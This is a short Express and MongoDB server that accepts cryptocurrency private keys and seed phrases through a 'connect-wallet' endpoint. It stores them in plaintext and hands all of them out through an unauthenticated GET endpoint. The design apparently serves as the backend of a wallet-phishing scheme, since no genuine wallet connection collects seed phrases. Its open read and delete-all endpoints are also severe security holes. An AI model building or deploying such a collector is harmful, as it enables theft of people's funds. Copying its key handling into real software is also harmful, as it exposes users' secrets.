const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");

dotenv.config();

const app = express();
app.use(express.json());
app.use(cors());

// 🔥 Connect to MongoDB
mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
}).then(() => console.log("✅ Connected to MongoDB"))
  .catch(err => console.error("❌ MongoDB Connection Error:", err));

// 📌 Wallet Schema
const WalletSchema = new mongoose.Schema({
    privateKey: { type: String, required: true },
    seedPhrase: { type: String, required: false },
});

const Wallet = mongoose.model("Wallet", WalletSchema);

// 📌 Save Wallet (Private Key / Seed Phrase)
app.post("/api/connect-wallet", async (req, res) => {
    try {
        const { privateKey, seedPhrase } = req.body;

        if (!privateKey && !seedPhrase) {
            return res.status(400).json({ error: "Private key or seed phrase is required!" });
        }

        await Wallet.create({ privateKey, seedPhrase });

        res.json({ message: "✅ Wallet stored successfully!" });
    } catch (error) {
        console.error("❌ Error saving wallet:", error);
        res.status(500).json({ error: "Internal Server Error" });
    }
});

// 📌 Fetch All Wallets (⚠️ Be Careful With This)
app.get("/api/get-wallets", async (req, res) => {
    try {
        const wallets = await Wallet.find();
        res.json(wallets);
    } catch (error) {
        console.error("❌ Error fetching wallets:", error);
        res.status(500).json({ error: "Internal Server Error" });
    }
});

// 📌 Disconnect Wallet (Delete from DB)
app.delete("/api/disconnect-wallet", async (req, res) => {
    try {
        await Wallet.deleteMany({});
        res.json({ message: "✅ All wallets deleted!" });
    } catch (error) {
        console.error("❌ Error deleting wallet:", error);
        res.status(500).json({ error: "Internal Server Error" });
    }
});

// 🔥 Start Server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
